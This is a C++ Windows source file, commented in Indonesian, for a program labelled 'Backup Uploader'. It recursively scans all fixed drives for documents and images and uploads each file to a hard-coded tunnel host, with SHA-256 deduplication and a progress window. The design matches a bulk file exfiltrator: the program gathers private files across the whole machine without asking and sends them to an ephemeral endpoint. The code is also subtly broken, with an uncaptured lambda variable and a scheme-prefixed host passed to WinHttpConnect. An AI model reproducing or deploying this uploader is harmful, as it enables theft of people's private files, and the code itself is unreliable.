// BackupUploader.cpp
// Target: Windows 7 - 10, dikompilasi via MinGW-w64 (GitHub Actions)

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif

#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <commctrl.h>

#include <atomic>
#include <condition_variable>
#include <cwctype>
#include <deque>
#include <fstream>
#include <mutex>
#include <set>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

// ===================== CONFIG =====================
static const wchar_t*      SERVER_HOST    = L"https://happy-hawk-634a0e14.tunnl.gg";   // ganti dengan host tunnel kamu
static const INTERNET_PORT SERVER_PORT    = 443;            // HTTPS
static const DWORD         SERVER_FLAGS   = WINHTTP_FLAG_SECURE;
static const wchar_t*      SERVER_PATH    = L"/upload.php";
static const wchar_t*      FORM_FIELD     = L"file";
static const unsigned long long MAX_SIZE  = 80ULL * 1024ULL * 1024ULL; // 80 MB
static const int           WORKER_COUNT   = 4;
static const wchar_t*      STATE_FILE     = L"state.json";
static const wchar_t*      LOG_FILE       = L"uploader.log";
static const DWORD         HTTP_TIMEOUT_MS = 300000;        // 5 menit

// Folder yang di-skip saat scan (huruf kecil)
static const std::set<std::wstring> SKIP_DIRS = {
    L"windows", L"program files", L"program files (x86)", L"programdata",
    L"$recycle.bin", L"system volume information", L"recovery", L"perflogs",
    L"appdata", L"node_modules", L".git", L"$windows.~bt", L"$windows.~ws"
};

// Hanya ekstensi ini yang di-scan (huruf kecil, tanpa titik)
static const std::set<std::wstring> ALLOWED_EXT = {
    // dokumen
    L"pdf", L"doc", L"docx", L"docm", L"dot", L"dotx",
    L"xls", L"xlsx", L"xlsm", L"xlsb", L"xlt", L"xltx", L"csv",
    L"ppt", L"pptx", L"pptm", L"pps", L"ppsx", L"odt", L"ods", L"odp",
    L"rtf", L"txt", L"md",
    // gambar
    L"jpg", L"jpeg", L"png", L"gif", L"bmp", L"tif", L"tiff", L"webp",
    L"heic", L"heif", L"svg", L"ico", L"raw", L"cr2", L"nef", L"arw", L"dng"
};

// ===================== STRUCTS / GLOBAL =====================
struct FileItem {
    std::wstring path;
    unsigned long long size;
};

static std::mutex g_queueMutex;
static std::condition_variable g_queueCv;
static std::deque<FileItem> g_queue;
static bool g_scanDone = false;

static std::mutex g_stateMutex;
static std::set<std::wstring> g_sentHashes;

static std::mutex g_logMutex;

static std::atomic<size_t> g_total{0};
static std::atomic<size_t> g_done{0};
static std::atomic<size_t> g_skipped{0};
static std::atomic<size_t> g_failed{0};
static std::atomic<size_t> g_duplicate{0};
static std::atomic<bool>   g_scanning{true};

static HWND g_hwndMain     = nullptr;
static HWND g_hwndProgress = nullptr;
static HWND g_hwndLabel    = nullptr;

#define WM_APP_UPDATE   (WM_APP + 1)
#define WM_APP_FINISHED (WM_APP + 2)

// ===================== UTIL =====================
void Log(const std::wstring& msg) {
    std::lock_guard<std::mutex> lk(g_logMutex);
    std::wofstream f(LOG_FILE, std::ios::app);
    f << msg << L"\n";
}

std::wstring ToLower(std::wstring s) {
    for (auto& c : s) c = (wchar_t)towlower(c);
    return s;
}

// Ambil ekstensi lowercase tanpa titik. Kosong jika tidak ada.
std::wstring GetExtLower(const std::wstring& name) {
    size_t dot = name.find_last_of(L'.');
    if (dot == std::wstring::npos || dot == 0 || dot + 1 >= name.size()) return L"";
    return ToLower(name.substr(dot + 1));
}

std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    if (n <= 0) return {};
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, nullptr, nullptr);
    return s;
}

// ===================== HASH SHA-256 =====================
bool HashFileSha256(const std::wstring& path, std::wstring& outHex) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_HASH_HANDLE hHash = nullptr;
    DWORD cbObj = 0, cbData = 0, cbHash = 0;
    std::vector<UCHAR> obj, hash;
    bool ok = false;

    do {
        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0) != 0) break;
        if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj, sizeof(cbObj), &cbData, 0) != 0) break;
        if (BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PUCHAR)&cbHash, sizeof(cbHash), &cbData, 0) != 0) break;
        obj.resize(cbObj);
        hash.resize(cbHash);
        if (BCryptCreateHash(hAlg, &hHash, obj.data(), cbObj, nullptr, 0, 0) != 0) break;

        std::vector<BYTE> buf(1 << 20);
        DWORD read = 0;
        bool readOk = true;
        while (true) {
            if (!ReadFile(hFile, buf.data(), (DWORD)buf.size(), &read, nullptr)) { readOk = false; break; }
            if (read == 0) break;
            if (BCryptHashData(hHash, buf.data(), read, 0) != 0) { readOk = false; break; }
        }
        if (!readOk) break;
        if (BCryptFinishHash(hHash, hash.data(), cbHash, 0) != 0) break;

        std::wstringstream ss;
        for (auto b : hash) {
            wchar_t tmp[3];
            swprintf_s(tmp, L"%02x", b);
            ss << tmp;
        }
        outHex = ss.str();
        ok = true;
    } while (false);

    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    CloseHandle(hFile);
    return ok;
}

// ===================== STATE LOKAL =====================
void LoadState() {
    std::wifstream f(STATE_FILE);
    std::wstring line;
    while (std::getline(f, line)) {
        if (!line.empty()) g_sentHashes.insert(line);
    }
}

void SaveHashToState(const std::wstring& hash) {
    std::lock_guard<std::mutex> lk(g_stateMutex);
    g_sentHashes.insert(hash);
    std::wofstream f(STATE_FILE, std::ios::app);
    f << hash << L"\n";
}

bool IsKnownHash(const std::wstring& hash) {
    std::lock_guard<std::mutex> lk(g_stateMutex);
    return g_sentHashes.count(hash) > 0;
}

// ===================== SCANNER =====================
void ScanDir(const std::wstring& dir) {
    WIN32_FIND_DATAW fd;
    std::wstring pattern = dir + L"\\*";
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        std::wstring name = fd.cFileName;
        if (name == L"." || name == L"..") continue;
        std::wstring full = dir + L"\\" + name;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (SKIP_DIRS.count(ToLower(name))) continue;
            ScanDir(full);
        } else {
            if (fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY)) continue;
            if (name == L"state.json" || name == L"uploader.log") continue;
            if (!ALLOWED_EXT.count(GetExtLower(name))) continue;

            unsigned long long size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            if (size == 0) continue;
            if (size > MAX_SIZE) { g_skipped++; continue; }

            {
                std::lock_guard<std::mutex> lk(g_queueMutex);
                g_queue.push_back({full, size});
                g_total++;
            }
            g_queueCv.notify_one();
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

void ScanAllDrives() {
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (!(mask & (1u << i))) continue;
        wchar_t root[4] = { (wchar_t)(L'A' + i), L':', L'\\', 0 };
        if (GetDriveTypeW(root) != DRIVE_FIXED) continue;
        ScanDir(std::wstring(root, 2));
    }
    {
        std::lock_guard<std::mutex> lk(g_queueMutex);
        g_scanDone = true;
    }
    g_scanning = false;
    g_queueCv.notify_all();
    if (g_hwndMain) PostMessage(g_hwndMain, WM_APP_UPDATE, 0, 0);
}

// ===================== HTTP =====================
struct HttpConn {
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
};

bool OpenConn(HttpConn& c) {
    c.hSession = WinHttpOpen(L"BackupUploader/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!c.hSession) return false;
    WinHttpSetTimeouts(c.hSession, 30000, 30000, 60000, HTTP_TIMEOUT_MS);
    c.hConnect = WinHttpConnect(c.hSession, SERVER_HOST, SERVER_PORT, 0);
    if (!c.hConnect) {
        WinHttpCloseHandle(c.hSession);
        c.hSession = nullptr;
        return false;
    }
    return true;
}

void CloseConn(HttpConn& c) {
    if (c.hConnect) WinHttpCloseHandle(c.hConnect);
    if (c.hSession) WinHttpCloseHandle(c.hSession);
    c.hConnect = c.hSession = nullptr;
}

// 1 = sudah ada di server, 0 = belum, -1 = error
int CheckRemote(const std::wstring& hash) {
    HttpConn c;
    if (!OpenConn(c)) return -1;

    std::wstring path = std::wstring(SERVER_PATH) + L"?check=" + hash;
    HINTERNET hRequest = WinHttpOpenRequest(c.hConnect, L"GET", path.c_str(), nullptr,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, SERVER_FLAGS);
    int result = -1;
    if (hRequest &&
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, nullptr)) {

        DWORD status = 0, sz = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
        if (status == 200) {
            std::string body;
            char buf[256];
            DWORD rd = 0;
            while (WinHttpReadData(hRequest, buf, sizeof(buf), &rd) && rd > 0) {
                body.append(buf, rd);
            }
            if (body == "exists") result = 1;
            else if (body == "missing") result = 0;
        }
    }
    if (hRequest) WinHttpCloseHandle(hRequest);
    CloseConn(c);
    return result;
}

bool UploadFile(const FileItem& item, const std::wstring& hash, std::wstring& err) {
    HANDLE hFile = CreateFileW(item.path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) { err = L"open failed"; return false; }

    LARGE_INTEGER fsz;
    if (!GetFileSizeEx(hFile, &fsz)) { CloseHandle(hFile); err = L"size failed"; return false; }
    unsigned long long fileSize = (unsigned long long)fsz.QuadPart;

    std::wstring fname = item.path.substr(item.path.find_last_of(L'\\') + 1);
    std::string fnameUtf8 = WideToUtf8(fname);
    std::string formField = WideToUtf8(FORM_FIELD);
    std::string boundary = "----BackupBoundary7MA4YWxkTrZu0gW";

    std::string head = "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"" + formField +
        "\"; filename=\"" + fnameUtf8 + "\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n";
    std::string tail = "\r\n--" + boundary + "--\r\n";

    unsigned long long totalLen = head.size() + fileSize + tail.size();
    if (totalLen > 0xFFFFFFFFULL) { CloseHandle(hFile); err = L"too large"; return false; }

    std::vector<BYTE> body;
    body.reserve((size_t)totalLen);
    body.insert(body.end(), head.begin(), head.end());
    {
        std::vector<BYTE> buf(1 << 20);
        DWORD rd = 0;
        while (true) {
            if (!ReadFile(hFile, buf.data(), (DWORD)buf.size(), &rd, nullptr)) {
                CloseHandle(hFile); err = L"read failed"; return false;
            }
            if (rd == 0) break;
            body.insert(body.end(), buf.begin(), buf.begin() + rd);
        }
    }
    CloseHandle(hFile);
    body.insert(body.end(), tail.begin(), tail.end());

    HttpConn c;
    if (!OpenConn(c)) { err = L"connect failed"; return false; }

    std::wstring contentType = L"Content-Type: multipart/form-data; boundary=" +
                               std::wstring(boundary.begin(), boundary.end());
    std::wstring hashHeader = L"X-File-Hash: " + hash;

    HINTERNET hRequest = WinHttpOpenRequest(c.hConnect, L"POST", SERVER_PATH, nullptr,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, SERVER_FLAGS);
    bool ok = false;
    if (hRequest) {
        WinHttpAddRequestHeaders(hRequest, contentType.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        WinHttpAddRequestHeaders(hRequest, hashHeader.c_str(), (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                               body.data(), (DWORD)body.size(), (DWORD)body.size(), 0) &&
            WinHttpReceiveResponse(hRequest, nullptr)) {
            DWORD status = 0, sz = sizeof(status);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
            ok = (status >= 200 && status < 300);
            if (!ok) err = L"HTTP " + std::to_wstring(status);
        } else {
            err = L"send failed";
        }
        WinHttpCloseHandle(hRequest);
    } else {
        err = L"request failed";
    }
    CloseConn(c);
    return ok;
}

// hash -> cek lokal -> cek server -> upload
void ProcessItem(const FileItem& item) {
    std::wstring hash;
    if (!HashFileSha256(item.path, hash)) {
        g_failed++;
        Log(L"FAIL hash: " + item.path);
        return;
    }

    if (IsKnownHash(hash)) { g_duplicate++; return; }

    int remote = CheckRemote(hash);
    if (remote == 1) {
        SaveHashToState(hash);
        g_duplicate++;
        return;
    }
    if (remote == -1) {
        g_failed++;
        Log(L"FAIL server tidak terjangkau: " + item.path);
        return;
    }

    std::wstring err;
    if (UploadFile(item, hash, err)) {
        SaveHashToState(hash);
    } else {
        g_failed++;
        Log(L"FAIL upload: " + item.path + L" (" + err + L")");
    }
}

void WorkerThread() {
    for (;;) {
        FileItem item;
        {
            std::unique_lock<std::mutex> lk(g_queueMutex);
            g_queueCv.wait(lk, [] { return !g_queue.empty() || g_scanDone; });
            if (g_queue.empty()) return;
            item = g_queue.front();
            g_queue.pop_front();
        }

        ProcessItem(item);
        g_done++;
        if (g_hwndMain) PostMessage(g_hwndMain, WM_APP_UPDATE, 0, 0);
    }
}

// ===================== GUI =====================
static const UINT_PTR TIMER_ANIM = 1;
static int g_marqueeTick = 0;

void UpdateLabel() {
    size_t done = g_done.load();
    size_t total = g_total.load();
    std::wstring text;
    if (g_scanning) {
        text = L"Memindai file... (" + std::to_wstring(total) + L" ditemukan)";
    } else {
        text = L"Terkirim: " + std::to_wstring(done) + L" / " + std::to_wstring(total) +
               L"   Duplikat: " + std::to_wstring(g_duplicate.load()) +
               L"   Gagal: " + std::to_wstring(g_failed.load()) +
               L"   Lewati (>80MB): " + std::to_wstring(g_skipped.load());
    }
    SetWindowTextW(g_hwndLabel, text.c_str());

    if (!g_scanning && total > 0) {
        SendMessage(g_hwndProgress, PBM_SETMARQUEE, FALSE, 0);
        SendMessage(g_hwndProgress, PBM_SETPOS, (WPARAM)(done * 1000 / total), 0);
    }
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_APP_UPDATE:
        UpdateLabel();
        return 0;
    case WM_APP_FINISHED:
        KillTimer(hwnd, TIMER_ANIM);
        UpdateLabel();
        MessageBoxW(hwnd, L"Selesai upload.", L"Backup Uploader", MB_OK | MB_ICONINFORMATION);
        PostQuitMessage(0);
        return 0;
    case WM_TIMER:
        if (wp == TIMER_ANIM) {
            if (g_scanning) {
                g_marqueeTick = (g_marqueeTick + 1) % 4;
                std::wstring dots(g_marqueeTick, L'.');
                std::wstring text = L"Memindai file" + dots + L" (" +
                                    std::to_wstring(g_total.load()) + L" ditemukan)";
                SetWindowTextW(g_hwndLabel, text.c_str());
            } else {
                UpdateLabel();
            }
        }
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

HWND CreateLoadingWindow(HINSTANCE hInst, int nCmdShow) {
    INITCOMMONCONTROLSEX icc{ sizeof(icc), ICC_PROGRESS_CLASS | ICC_STANDARD_CLASSES };
    InitCommonControlsEx(&icc);

    WNDCLASSW wc{};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"BackupUploaderWnd";
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(0, wc.lpszClassName, L"Backup Uploader",
                                WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                                CW_USEDEFAULT, CW_USEDEFAULT, 520, 160,
                                nullptr, nullptr, hInst, nullptr);
    if (!hwnd) return nullptr;

    g_hwndLabel = CreateWindowExW(0, L"STATIC", L"Memindai file...",
                                  WS_CHILD | WS_VISIBLE, 15, 15, 480, 20,
                                  hwnd, nullptr, hInst, nullptr);
    g_hwndProgress = CreateWindowExW(0, PROGRESS_CLASSW, nullptr,
                                     WS_CHILD | WS_VISIBLE | PBS_MARQUEE, 15, 45, 480, 22,
                                     hwnd, nullptr, hInst, nullptr);
    SendMessage(g_hwndProgress, PBM_SETRANGE, 0, MAKELPARAM(0, 1000));
    SendMessage(g_hwndProgress, PBM_SETMARQUEE, TRUE, 30);

    g_hwndMain = hwnd;
    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);
    SetTimer(hwnd, TIMER_ANIM, 400, nullptr);
    return hwnd;
}

// ===================== ENTRY =====================
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int nCmdShow) {
    LoadState();

    HWND hwnd = CreateLoadingWindow(hInst, nCmdShow);
    if (!hwnd) return 1;

    std::thread scanner(ScanAllDrives);

    std::vector<std::thread> workers;
    for (int i = 0; i < WORKER_COUNT; i++) workers.emplace_back(WorkerThread);

    std::thread waiter([hwnd] {
        scanner.join();
        for (auto& t : workers) t.join();
        PostMessage(hwnd, WM_APP_FINISHED, 0, 0);
    });

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    waiter.join();
    return 0;
}
